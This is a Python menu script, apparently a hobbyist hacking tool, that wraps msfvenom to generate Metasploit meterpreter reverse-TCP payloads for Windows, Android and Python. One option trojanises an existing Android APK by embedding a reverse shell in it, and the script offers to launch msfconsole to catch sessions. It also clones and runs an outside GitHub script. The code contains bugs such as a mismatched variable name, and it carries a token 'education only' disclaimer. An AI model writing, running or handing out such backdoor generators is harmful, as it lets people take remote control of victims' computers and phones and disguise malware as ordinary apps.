from os import system
from time import sleep
import sys
import time
#Colors
R= "\033[1;31m"
G= "\033[1;32m"
Y= "\033[1;33m"
B= "\033[1;34m"
P= "\033[1;35m"
U= "\033[1;36m"
#####################
def injection_payload():
    system('clear') 
    print( " " +G+
 """

 \ \        /     (_)         | |                                              | |               | |
  \ \  /\  / /   _   _ __   __| | _____      _____   ______   _ __   __ _ _   _| | ___   __ _  __| |
   \ \/  \/ /   | |   '_ \ / _` |/ _ \ \ /\ / / __| |______| | '_ \ / _` | | | | |/ _ \ / _` |/ _` |
    \  /\  /    | | |   | | (_| | (_) \ V  V /\__ \          | |_) | (_| | |_| | | (_) | (_| | (_| |
     \/  \/     |_|_ | |_|\__,_|\___/ \_/\_/ |___/          | .__/ \__,_|\__, |_|\___/ \__,_|\__,_|
                                                         | |           __/ |
                                                         |_|          |___/
""")

    system("apt-get install xterm")
    system ("apt-get install zipalign"  )
    system ("apt-get install aapt" )
    system ("apt-get install openjdk-11-jdk"   )
    system ("apt-get install apksigner"  )
    system ( """
git clone  https://github.com/graylagx2/apktoolfix.git
cd apktoolfix
chmod+	x *
bash apktoolfix_2.1.2.sh
""")
    ip = input  (" " +B+"EnterYour IP ::->")
    port = input  (" " +G+"Enter your  port ::->")
    Name= input  (" " +B+"Enter the name of your payload" +Y+" For example "+"nano-micro-hello  ::-->")
    inject = input ( " " +B+"Enter the name  Of payload or path to inject  the original payload inside it  *APK ONLY* :: " )
    system ( "msfvenom -p android/meterpreter/reverse_tcp lhost "+ip+"lport="+port+" -x " +inject+" -o "+name+ ".apk" )
    sleep(3.0)
    system ('clear')
    p= input (" Do u want to open a session Y/N " )
    if p =='y' or p =='Y' :
        system('clear')
        system('msfconsole')
    elif p == 'n' or p=='N' :
        sys.exit()


#####################
def windows_payload ( ):
    system('clear')
    print (" "+B+
"""
__          _______ _   _ _____   ______          _______       _____    __     ___      ____          _____  
 \ \        / /_   _| \ | |  __ \ / __ \ \        / / ____|     |  __ \ /\\ \   / / |    / __ \   /\   |  __ \ 
  \ \  /\  / /  | | |  \| | |  | | |  | \ \  /\  / / (___ ______| |__) /  \\ \_/ /| |   | |  | | /  \  | |  | |
   \ \/  \/ /   | | | . ` | |  | | |  | |\ \/  \/ / \___ \______|  ___/ /\ \\   / | |   | |  | |/ /\ \ | |  | |
    \  /\  /   _| |_| |\  | |__| | |__| | \  /\  /  ____) |     | |  / ____ \| |  | |___| |__| / ____ \| |__| |
     \/  \/   |_____|_| \_|_____/ \____/   \/  \/  |_____/      |_| /_/    \_\_|  |______\____/_/    \_\_____/ 
 \n """)
    ip = input  (" " +B+"EnterYour IP ::->" )
    port = input  (" "+G+"Enter port IP::->" )
    Name = input  (" " +B+"Enter the name of your payload " +Y+" For example"+"nano-micro-hello  ::-->")
    system ("msfvenom -p windows/meterpreter/reverse_tcp -f exe  lhost=" +ip+" lport="+port+ "  -o  " +name+".exe ")
    sleep(3.0)
    system('clear')
    
####################

def android_payload( ):
    system('clear')
    print ( " "+G+
"""
                     _           _     _                              _                 _ 
     /\             | |         (_)   | |                            | |               | |
    /  \   _ __   __| |_ __ ___  _  __| |  ______   _ __   __ _ _   _| | ___   __ _  __| |
   / /\ \ | '_ \ / _` | '__/ _ \| |/ _` | |______| | '_ \ / _` | | | | |/ _ \ / _` |/ _` |
  / ____ \| | | | (_| | | | (_) | | (_| |          | |_) | (_| | |_| | | (_) | (_| | (_| |
 /_/    \_\_| |_|\__,_|_|  \___/|_|\__,_|          | .__/ \__,_|\__, |_|\___/ \__,_|\__,_|
                                                   | |           __/ |                    
                                                   |_|          |___/                     
\n""")
    ip = input  (" " +B+"EnterYour IP ::->")
    port = input  (" " +G+"Enter your  port ::->")
    Name= input  (" " +B+"Enter the name of your payload" +Y+" For example "+"nano-micro-hello  ::-->")
    system ("msfvenom -p android/meterpreter/reverse_tcp lhost=" +ip+" lport="+port+ "  -o  " +name+".apk "  )
    sleep(3.0)

####################
def python_payload ( ):
    system('clear')
    print ( " "+Y+
"""
  _____       _   _                                              _                 _ 
 |  __ \     | | | |                                            | |               | |
 | |__) |   _| |_| |__   ___  _ __    ______   _ __   __ _ _   _| | ___   __ _  __| |
 |  ___/ | | | __| '_ \ / _ \| '_ \  |______| | '_ \ / _` | | | | |/ _ \ / _` |/ _` |
 | |   | |_| | |_| | | | (_) | | | |          | |_) | (_| | |_| | | (_) | (_| | (_| |
 |_|    \__, |\__|_| |_|\___/|_| |_|          | .__/ \__,_|\__, |_|\___/ \__,_|\__,_|
         __/ |                                | |           __/ |                    
        |___/                                 |_|          |___/                     
\n""")

    ip = input  (" " +B+"Enter Your  IP ::->")
    port = input  (" " +G+"Enter  your  port ::->")
    Name= input  (" " +B+"Enter the name of your payload "  +Y+" For example "+"nano-micro-hello  ::-->")
    system ("msfvenom -p python/meterpreter/reverse_tcp lhost= " +ip+" lport="+port+ "  -o  " +name+".py " )
    sleep(3.0)
##################
def main_payload( ):
    while True :
        system('clear')
        print (" "+R+
"""
					 		
…………………▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
……………▄▄█▓▓▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓█▄▄
…………▄▀▀▓▒░░░░░░░░░░░░░░░░▒▓▓▀▄
………▄▀▓▒▒░░░░░░░░░░░░░░░░░░░▒▒▓▀▄
……..█▓█▒░░░░░░░░░░░░░░░░░░░░░▒▓▒▓█
…..▌▓▀▒░░░░░░░░░░░░░░░░░░░░░░░░▒▀▓█
…..█▌▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░▒▓█
…▐█▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓█▌
…█▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓█
..█▐▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒█▓█
…█▓█▒░░░░░░░░░░░░░░░░░░░░░░░░░░░▒█▌▓█
..█▓▓█▒░░░░▒█▄▒▒░░░░░░░░░▒▒▄█▒░░░░▒█▓▓█
..█▓█▒░▒▒▒▒░░▀▀█▄▄░░░░░▄▄█▀▀░░▒▒▒▒░▒█▓█
.█▓▌▒▒▓▓▓▓▄▄▄▒▒▒▀█░░░░█▀▒▒▒▄▄▄▓▓▓▓▒▒▐▓█
.██▌▒▓███▓█████▓▒▐▌░░▐▌▒▓████▓████▓▒▐██
..██▒▒▓███▓▓▓████▓▄░░░▄▓████▓▓▓███▓▒▒██
..█▓▒▒▓██████████▓▒░░░▒▓██████████▓▒▒▓█
..█▓▒░▒▓███████▓▓▄▀░░▀▄▓▓███████▓▒░▒▓█
….█▓▒░▒▒▓▓▓▓▄▄▄▀▒░░░░░▒▀▄▄▄▓▓▓▓▒▒░▓█
……█▓▒░▒▒▒▒░░░░░░▒▒▒▒░░░░░░▒▒▒▒░▒▓█
………█▓▓▒▒▒░░██░░▒▓██▓▒░░██░░▒▒▒▓▓█
………▀██▓▓▓▒░░▀░▒▓████▓▒░▀░░▒▓▓▓██▀
………….░▀█▓▒▒░░░▓█▓▒▒▓█▓▒░░▒▒▓█▀░
…………█░░██▓▓▒░░▒▒▒░▒▒▒░░▒▓▓██░░█
………….█▄░░▀█▓▒░░░░░░░░░░▒▓█▀░░▄█
…………..█▓█░░█▓▒▒▒░░░░░▒▒▒▓█░░█▓█
…………….█▓█░░█▀█▓▓▓▓▓▓█▀░░█░█▓█▌
……………..█▓▓█░█░█░█▀▀▀█░█░▄▀░█▓█
……………..█▓▓█░░▀█▀█░█░█▄█▀░░█▓▓█
………………█▓▒▓█░░░░▀▀▀▀░░░░░█▓▓█
………………█▓▒▒▓█░░░░ ░░░░░░░█▓▓█
………………..█▓▒▓██▄█░░░▄░░▄██▓▒▓█
………………..█▓▒▒▓█▒█▀█▄█▀█▒█▓▒▓█
………………..█▓▓▒▒▓██▒▒██▒██▓▒▒▓█
………………….█▓▓▒▒▓▀▀███▀▀▒▒▓▓█
……………………▀█▓▓▓▓▒▒▒▒▓▓▓▓█▀
………………………..▀▀██▓▓▓▓██▀


 		𝙏𝙝𝙞𝙨 𝙩𝙤𝙤𝙡 𝙞𝙨 𝙛𝙤𝙧 𝙥𝙚𝙖𝙘𝙚𝙛𝙪𝙡 𝙪𝙨𝙚 𝙖𝙣𝙙 𝙚𝙙𝙪𝙘𝙖𝙩𝙞𝙤𝙣 𝙤𝙣𝙡𝙮
						𝙄'𝙢 𝙣𝙤𝙩 𝙧𝙚𝙨𝙥𝙤𝙣𝙨𝙞𝙗𝙡𝙚 𝙛𝙤𝙧 𝙗𝙖𝙙 𝙪𝙨𝙖𝙜𝙚 𝙤𝙧 𝙝𝙖𝙧𝙢𝙞𝙣𝙜 𝙥𝙚𝙤𝙥𝙡𝙚 𝙬𝙞𝙩𝙝 𝙩𝙝𝙞𝙨 𝙩𝙤𝙤𝙡
																									BEST WISHIES : ESSAM	 


""" )


        print (" " +B+"["+Y+"1"+B+"] Windows- Payload" )
        print (" " +B+"["+Y+"2"+B+"] Android- Payload" )
        print (" " +B+"["+Y+"3"+B+"] Python- Payload   " )
        print (" " +B+"["+Y+"4"+B+"] inject Android player- Payload   " )
        print (" " +R+"["+R+"stop"+R+"] To exit the  program    \n " )

        x = input ("Enter your selection ::--->"  )
        if x=='1' :
            windows_payload()

        elif x=='2':
            android_payload()

        elif x=='3' :
            python_payload()

        elif x =='4':
            injection_payload()
        elif  x  == 'stop' or x ==' STOP '  :
            break
        else :
            system ('clear')
            print (" "+R+"Choose a correct Number and try again" )
            sleep(2.0)
main_payload()
windows_payload()
android_payload()
